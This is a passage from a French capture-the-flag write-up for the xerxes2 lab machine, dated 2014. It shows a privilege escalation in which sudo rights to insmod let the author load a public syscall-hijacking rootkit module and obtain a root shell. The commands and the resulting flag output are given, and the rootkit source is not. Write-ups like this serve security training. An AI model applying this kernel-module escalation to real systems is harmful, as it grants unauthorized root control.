-rw-r--r-- korenchkin/korenchkin  400 2014-07-16 20:17 .ssh/id_rsa.pub
```

Quatrième énigme
----------------

L'utilisateur a des permissions *sudo* pour charger et décharger des modules kernel :  

```plain
korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
```

J'ai choisi d'utiliser une rootkit LKM [décrite sur le blog de memset](http://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/) :  

Il faut seulement changer dans le code l'adresse de la *sys\_call\_table* par celle effective du système :  

```plain
korenchkin@xerxes2:~$ grep sys_call_table /boot/System.map-3.2.0-4-686-pae 
c12cce90 R sys_call_table
```

Après on insère la rootkit et on utilise le programme d'exemple :  

```plain
korenchkin@xerxes2:~$ sudo insmod rootkit.ko 
korenchkin@xerxes2:~$ ./test
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
# cat flag*
____   ___  ____  ___  __ ____   ___  ____     ____     ____   
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

 congratulations on beating xerxes2!

 I hope you enjoyed it as much as I did making xerxes2. 
 xerxes1 has been described as 'weird' and 'left-field'
 and I hope that this one fits that description too :)

 Many thanks to @TheColonial & @rasta_mouse for testing!

 Ping me on #vulnhub for thoughts and comments!

       @barrebas, July 2014
```

Bingo !

*Published August 14 2014 at 18:43*